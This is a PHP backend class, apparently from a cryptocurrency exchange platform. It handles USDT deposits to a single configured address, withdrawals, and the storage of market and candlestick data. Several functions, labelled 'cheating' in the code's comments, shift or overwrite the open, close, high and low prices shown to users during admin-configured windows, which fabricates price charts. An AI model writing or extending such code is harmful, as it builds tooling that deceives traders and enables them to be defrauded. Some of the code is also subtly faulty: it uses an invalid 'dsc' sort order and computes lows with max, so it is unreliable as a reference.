<?php

namespace app\api\logic;

use fast\Random;
use think\Cache;
use think\Config;
use think\Db;
use think\Exception;

/**
 * Usdt接口
 */
class Usdt
{

    private static $server = array();

    //充币=================================

	//充币信息
	public function getBuyInfo()
	{
		$tip = config("site.buy_usdt_tips");
		$address = config("site.usdt_address");
		$data = [
			'coin_type'=>'USDT',
			'to_address'=>$address,
			'tips'=>$tip,
		];
		return $data;
	}

	//获取充币订单列表
	public function getBuyOrderList($where,$page_rows="20")
	{
		$data = Db::name('order_cashin')->field('id,user_id,username,address,amount,image,status,note,createtime,opertime')
			->where($where)
			->order('createtime desc')
			->paginate($page_rows,true,[
				'query' => []
			]);
		return $data;
	}

	//获取充币订单列表
	public function Buy($data)
	{
		$ret = Db::name('order_cashin')->insertGetId($data);
		return $ret;
	}

	//获取余额
	public function getBalance($uid)
	{
		$ret = Db::name('user')->where('id',$uid)->value("money");
		return $ret;
	}

	//卖币 ==================================
	//最新USDT汇率
	public function getLatestPrice()
	{
		//汇率
        $usdt_price = 6.3;
        $inc_price = 6.39;
        $is_real_price = BaseConfig::getInstance()->getBaseConfig('is_real_price');
        if($is_real_price){
            //实时价格从接口取
        }else {
            //固定价格
            $usdt_price = BaseConfig::getInstance()->getBaseConfig('cn_price');
            $inc_point = BaseConfig::getInstance()->getBaseConfig('inc_point');
            $inc_price = $usdt_price * (1 + $inc_point);
        }

        $usdt_rate = [
			"huobi"=>$usdt_price,
			"local"=>$inc_price,
		];
		return $usdt_rate;
	}

	//获取卖币订单列表
	public function getSellOrderList($where,$page_rows="20")
	{
		$data = Db::name('order_cashout')->field('id,user_id,username,num,rate,type,status,note,createtime,opertime')
			->where($where)
			->order('createtime desc')
			->paginate($page_rows,true,[
				'query' => []
			]);
		return $data;
	}

	//获取充币订单列表
	public function Sell($data)
	{
		$ret = Db::name('order_cashout')->insertGetId($data);
		return $ret;
	}

	//查询所有启用的交易对
    public function getTokenQueue($field = 'switch') {
        return Db::name('token_queue')->where($field,'=','1')->select();
    }

    //写入行情
    public function addMarket($token_id,$symbol,$ts,$data) {
        if ($data['open'] <= 0) {
            return false;
        }
        try {

//            $data = $this->getZBMarketPrice($data,$symbol);

            //获取全局浮动
            $fd_price = BaseConfig::getInstance()->getBaseConfig('kline_add_point');

//            $this->setMarketToRedis($symbol,[
//                'amount' => $data['amount'],
//                'open' => $data['open'] + $fd_price,
//                'close' => $data['close'] + $fd_price,
//                'high' => $data['high'] + $fd_price,
//                'count' => $data['count'],
//                'low' => $data['low'] + $fd_price,
//                'vol' => $data['vol'],
//            ]);


//            $key = json_encode(['market_id' => $data['id'],'symbol' => $symbol]);
//            $key = sprintf('new1_token_%s',md5($key));

            $key = sprintf('websocket_token_market_%s_%s',md5($symbol),$ts);

            $redis = Cache::init()->handler();
            if ($redis->exists($key)) {
                //更新
//                Db::name('token_market')->where(['symbol' => $symbol,'market_id' => $data['id']])->update([
//                    'amount' => $data['amount'],
//                    'open' => $data['open'] + $fd_price,
//                    'close' => $data['close'] + $fd_price,
//                    'high' => $data['high'] + $fd_price,
//                    'count' => $data['count'],
//                    'low' => $data['low'] + $fd_price,
//                    'vol' => $data['vol'],
//                    'update_time' => time()
//                ]);

                return false;
            }

            //作弊
            $data = Zuobi::getInstance()->check($symbol,$fd_price,$data);

            Db::name('token_market')->insert([
                'amount' => $data['amount'],
                'open' => $data['open'],
                'close' => $data['close'],
                'high' => $data['high'],
                'count' => $data['count'],
                'low' => $data['low'],
                'vol' => $data['vol'],
                'token_id' => $token_id,
                'create_time' => $ts,
                'symbol' => $symbol,
                'market_id' => $data['id'],
                'update_time' => time()
            ]);
            //更新价格
            Db::name('tokens')->where('token_id','=',$token_id)->update(['price' => $data['close']]);

            $redis->set($key,1);
            $redis->expire($key,86400);

            return true;
        } catch (Exception $e) {
            $redis->set($key,1);
            $redis->expire($key,86400);
            dump($e->getMessage());
        }
    }

    //获取作弊k线价格
    public function getZBMarketPrice($data,$symbol) {
        $config = Db::name('token_no_market_time')->where('symbol','=',$symbol)->find();
        if (!$config) {
            return $data;
        }
        if ($config['start_time'] > time() || $config['end_time'] < time()) {
            return $data;
        }
        //作弊
        $type = $config['type'];
        $num = $config['num'];
        if ($type == 1) {
            //模式一
            $data['open'] = $data['open'] + $num;
            $data['close'] = $data['close'] + $num;
            $data['high'] = $data['high'] + $num;
            $data['low'] = $data['low'] + $num;
        } else {
            //模式二
            //查询上一个价格数据
            $last_data = Db::name('token_market')
                ->where('symbol','=',$symbol)
                ->order('create_time dsc')
                ->limit(0,1)
                ->find();
            if ($last_data) {
                $data['open'] = $last_data['open'] + $num;
                $data['close'] = $last_data['close'] + $num;
                $data['high'] = $last_data['high'] + $num;
                $data['low'] = $last_data['low'] + $num;
            }
        }
        return $data;
    }


    //根据名称查询tokenid
    public function getTokenIdByName($name) {
        return Db::name('tokens')->where('name','=',$name)->value('token_id');
    }

    //写入k线队列
    public function addKline($symbol,$period,$data) {

        $check = Zuobi::getInstance()->checkKline($symbol,$data);
        $is = $check['is'];
        $data = $check['data'];

        try {
            $key = json_encode(['period_time' => $data['id'],'period' => $period,'symbol' => $symbol]);
            $key = sprintf('new1_token_%s',md5($key));

            $redis = Cache::init()->handler();
            if ($redis->exists($key)) {
//                dump('更新k线');
//
//                //更新
                Db::name('token_kline')->where(['symbol' => $symbol,'period' => $period,'period_time' => $data['id']])->where('is','=',0)->update([
                    'open' => $data['open'],
                    'close' => $data['close'],
//                    'low' => $data['low'],
//                    'high' => $data['high'],
                    'amount' => $data['amount'],
                    'vol' => $data['vol'],
                    'count' => $data['count'],
                    'symbol' => $symbol,
                    'period' => $period,
                    'period_time' => $data['id'],
                    'create_time' => time(),
                ]);

                return false;
            }

//        $data = $this->getZBKlinePrice($data,$symbol,$period);

            Db::name('token_kline')->insert([
                'open' => $data['open'],
                'close' => $data['close'],
                'low' => $data['low'],
                'high' => $data['high'],
                'amount' => $data['amount'],
                'vol' => $data['vol'],
                'count' => $data['count'],
                'symbol' => $symbol,
                'period' => $period,
                'period_time' => $data['id'],
                'create_time' => time(),
                'is' => $is
            ]);

            $redis->set($key,1);
            $redis->expire($key,86400);
        } catch (Exception $e) {
            $redis->set($key,1);
            $redis->expire($key,86400);
            dump($e->getMessage());
        }
    }

    //获取作弊k线价格
    public function getZBKlinePrice($data,$symbol,$period) {

        $kline_add_point = BaseConfig::getInstance()->getBaseConfig('kline_add_point');
        $data['open'] = $data['open'] + $kline_add_point;
        $data['close'] = $data['close'] + $kline_add_point;
        $data['high'] = $data['high'] + $kline_add_point;
        $data['low'] = $data['low'] + $kline_add_point;

        if (!in_array($period,['1min','5min'])) {
            return $data;
        }
        $config = Db::name('token_no_market_time')->where('symbol','=',$symbol)->find();
        if (!$config) {
            return $data;
        }
        if ($config['start_time'] > time() || $config['end_time'] < time()) {
            return $data;
        }
        //作弊
        $type = $config['type'];
        $num = $config['num'];
        if ($type == 1) {
            //模式一
            $data['open'] = $data['open'] + $num;
            $data['close'] = $data['close'] + $num;
            $data['high'] = $data['high'] + $num;
            $data['low'] = $data['low'] + $num;
        } else {
            //模式二
            //查询上一个价格数据
            $last_data = Db::name('token_kline')
                ->where('symbol','=',$symbol)
                ->where('period','=',$period)
                ->order('period_time dsc')
                ->limit(0,1)
                ->find();
            if ($last_data) {
                $data['open'] = $last_data['open'] + $num;
                $data['close'] = $last_data['close'] + $num;
                $data['high'] = $last_data['high'] + $num;
                $data['low'] = $last_data['low'] + $num;
            }
        }
        return $data;
    }


    //作弊，根据行情数据，生成新的k线价格
    public function getNewKlinePrice($price,$symbol,$period) {
        $periods = [
            '1min' => 60,
            '5min' => 300,
            '15min' => 900,
            '30min' => 1800,
            '60min' => 3600,
            '4hour' => 4 * 60 * 60,
            '1day' => 86400,
            '1mon' => 30 * 86400
        ];
        $time = $periods[$period];
        //查询数据
        $open = Db::name('token_market')->where('symbol','=',$symbol)->where('create_time','>=',time() - $time)->order('id asc')->limit(0,1)->value('open');
        $close = Db::name('token_market')->where('symbol','=',$symbol)->where('create_time','<=',time())->order('id desc')->limit(0,1)->value('close');
        $high = Db::name('token_market')->where('symbol','=',$symbol)->where('create_time','>=',time() - $time)->where('create_time','<=',time())->max('high');
        $low = Db::name('token_market')->where('symbol','=',$symbol)->where('create_time','>=',time() - $time)->where('create_time','<=',time())->max('low');

        $price_add = BaseConfig::getInstance()->getBaseConfig('kline_add_point');
        return [
            'open' => $open == 0 ? $price['open'] : $open + $price_add,
            'close' => $close == 0 ? $price['close'] : $close + $price_add,
            'high' => $high == 0 ? $price['high'] : $high + $price_add,
            'low' => $low == 0 ? $price['low'] : $low + $price_add
        ];
    }

    //查询行情
    public function getMarket($token_id) {
        $query = Db::name('token_queue');
        if ($token_id > 0) {
            $query->where('token_id','=',$token_id);
        }
        $data = Db::name('token_queue')->field('symbol')->select();
        foreach ($data as $k => &$v) {
            $v['price'] = (new Tran())->getPriceBySymbol($v['symbol']);
            //计算涨跌幅
            $v['scope'] = $this->getScope($v['symbol'],$v['price']);
            $v['price'] = sprintf('%.2f',$v['price']);
            $v['cny_price'] = sprintf('%.2f',$v['price'] * BaseConfig::getInstance()->getBaseConfig('cn_price'));
            $tran_amount = $this->getTranAmount($v['symbol']);
            $v['high'] = $tran_amount['high'];
            $v['low'] = $tran_amount['low'];
            $v['amount'] = $tran_amount['amount'];
        }
        return $data;
    }

    //计算涨跌幅
    public function getScope($symbol,$price) {
        $start_time = time() - 86400;
        $data = Db::name('token_market')
            ->where('symbol','=',$symbol)
            ->where('create_time','>=',$start_time)
            ->order('id asc')
            ->limit(0,1)
            ->find();
        if (!$data) {
            return '0%';
        }
        $close = $data['close'];

        Db::name('token_market')
            ->where('symbol','=',$symbol)
            ->where('create_time','<=',$start_time)
            ->delete();

        return sprintf("%.4f",($price - $close) / $close) * 100 . '%';
    }

    //查询主流币信息
    public function getMainCoinInfo() {
        $data = Db::name('token_queue')->field('symbol')->where('symbol','in',['BTC/USDT','ETH/USDT','LTC/USDT'])->select();
        foreach ($data as $k => &$v) {
            $v['price'] = Db::name('token_market')->where('symbol','=',$v['symbol'])->order('id desc')
                ->limit(0,1)
                ->value('close');
            //计算涨跌幅
            $v['scope'] = $this->getScope($v['symbol'],$v['price']);
            $v['price'] = sprintf('%.2f',$v['price']);
            $v['cny_price'] = sprintf('%.2f',$v['price'] * BaseConfig::getInstance()->getBaseConfig('cn_price'));
        }
        return $data;
    }

    //查询k线图
    public function getKline($symbol,$period,$from,$to) {
        if ($period == '1s') {
            return $this->getFromMarket($symbol,$from,$to);
        }
        return Db::name('token_kline')->where(['symbol' => $symbol,'period' => $period])
            ->where('period_time','>',$from)
            ->where('period_time','<=',$to)
            ->order('period_time desc')
            ->select();
    }

    public function getKlineNew($symbol,$period) {
        return Db::name('token_kline')->where(['symbol' => $symbol,'period' => $period])
            ->order('period_time desc')
            ->limit(0,1)
            ->find();
    }

    public function getFromMarket($symbol,$from,$to) {
        $data = Db::name('token_market')->where('symbol','=',$symbol)
            ->where('create_time','>',$from)
            ->where('create_time','<=',$to)
            ->field('amount,open,close,high,low,vol,count,symbol,create_time period_time,create_time')
            ->select();
        for ($i = 0;$i < count($data); $i++) {
            if ($i == 0) {
                continue;
            }
            $data[$i]['open'] = $data[$i - 1]['close'];
        }
        unset($data[0]);
        return array_values($data);
    }


    //写入最新交易
    public function addNewTran($data) {
        if (Db::name('token_tran')->where($data)->count() > 0) {
            return false;
        }
        $data['create_time'] = time();
        return Db::name('token_tran')->insert($data);
    }

    //写入深度图
    public function addDepth($symbol,$type,$data) {

        $key = sprintf('depth_token_%s_%s',$symbol,$type);

        $redis = Cache::init()->handler();

        unset($data['type']);
        unset($data['symbol']);

        $redis->set($key,json_encode($data));
    }

    //获取深度数据
    public function getDepth($symbol,$type) {
        try {
            $key = sprintf('depth_token_%s_%s',$symbol,$type);

            $redis = Cache::init()->handler();
            $data = $redis->get($key);
            $data = json_decode($data,true);

            if(is_array($data)){
                foreach ($data as &$v) {
                    unset($v['type']);
                    unset($v['symbol']);
                    $v['count'] = (string)$v['count'];
                    $v['price'] = (string)$v['price'];
                }
                return array_values($data);
            }

            return [];

        } catch (Exception $e) {
            dump($e->getMessage());
            return false;
        }
    }

    //获取币种最新价格
    public function getNewPrice($symbol) {
        $data = Db::name('token_market')->where('symbol','=',$symbol)->order('create_time desc')
            ->limit(0,1)->find();
        $new_data = [];
        $new_data['price'] = sprintf('%.2f',$data['close']);
        $new_data['cny_price'] = sprintf('%.2f',$data['close'] * BaseConfig::getInstance()->getBaseConfig('cn_price'));
        $new_data['scope'] = $this->getScope($data['symbol'],$data['close']);
        return $new_data;
    }

    //获取所有支持的主币
    public function getMainToken() {
        return Db::name('tokens')->field('token_id,name')->where('is_main_token','=','1')->select();
    }

    //查询作弊时间间隔
    public function getNoMarketTime($symbol) {
        return Db::name('token_no_market_time')->where('id','=',1)->where('symbol','=',$symbol)->find();
    }

    //查询交易量
    public function getTranAmount($symbol) {
        $data['price'] = Db::name('token_market')->where('symbol','=',$symbol)->order('id desc')
            ->limit(0,1)
            ->value('close');
        //计算涨跌幅
        $data['scope'] = $this->getScope($symbol,$data['price']);
        $data['price'] = sprintf('%.2f',$data['price']);
        $data['cny_price'] = sprintf('%.2f',$data['price'] * BaseConfig::getInstance()->getBaseConfig('cn_price'));
        $data['high'] = Db::name('token_market')->where('symbol','=',$symbol)->order('create_time desc')->limit(0,1)->value('high');
        $data['low'] = Db::name('token_market')->where('symbol','=',$symbol)->order('create_time desc')->limit(0,1)->value('low');
        $data['amount'] = Db::name('token_market')->where('symbol','=',$symbol)->order('create_time desc')->limit(0,1)->value('amount');
        return $data;
    }

    //market to redis
    public function setMarketToRedis($symbol,$data) {
        $key = sprintf('market_%s',$symbol);
        $redis = Cache::init()->handler();
        $redis->set($key,json_encode($data));
    }

    //get from redis
    public function getMarketToRedis($symbol) {
        $key = sprintf('market_%s',$symbol);
        $redis = Cache::init()->handler();
        $data = $redis->get($key);
        $data = json_decode($data,true);
        return $data;
    }

    /**
     * 单例入口
     * @return mixed
     */
    public static function getInstance() {
        $className =  get_called_class();
        if(!isset(self::$server[$className])){
            self::$server[$className] = new $className();
        }
        return self::$server[$className];
    }
}
